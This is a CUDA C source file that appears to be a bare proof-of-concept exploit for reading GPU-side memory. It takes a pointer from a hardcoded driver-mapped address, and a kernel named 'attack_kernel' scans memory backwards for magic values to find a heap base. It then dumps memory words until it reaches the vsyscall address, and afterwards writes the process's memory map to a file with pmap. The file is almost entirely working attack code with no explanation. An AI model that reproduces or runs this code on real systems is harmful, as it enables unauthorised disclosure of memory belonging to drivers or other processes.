#include <cuda_runtime.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

__global__ void kernel()
{
    return;
}

__global__ void attack_kernel(size_t *p)
{

    size_t i = 0;
    bool flag1 = false;
    bool flag2 = false;


    size_t *heap_base;
    while(1) {

        if (flag2 && *(p - i) == 0x300200000) {
	    heap_base = (size_t *)(p - i);
	    break;
	}
        else flag2 = false;

        if (flag1 && *(p - i) == 0x10000000000) flag2 = true;
        else flag1 = false;

        if (*(p - i) ==  0x10004000000) flag1 = true;
        i++;
    }

    for(int i = 0; *(heap_base + i) != 0xffffffffff600000; ++i) {
        printf("%lx: %lx\n", heap_base + i, *(heap_base + i));
    }

}


int main()
{

    kernel<<<1, 1>>>();
    cudaDeviceSynchronize();



    unsigned char **pp = (unsigned char **) (0x200400000ULL + 0x7ce8);
    size_t *p   = (size_t*)*pp;
    attack_kernel<<<1, 1>>>(p);
    
    // Wait for the kernel to finish
    cudaDeviceSynchronize();

    pid_t pid = getpid();
    char cmd[64];
    int ret;
    
    snprintf(cmd, sizeof(cmd), "pmap %d > map", pid);

    ret = system(cmd);
    if (ret == -1) {
        perror("system");
        return EXIT_FAILURE;
    }

    return 0;
}
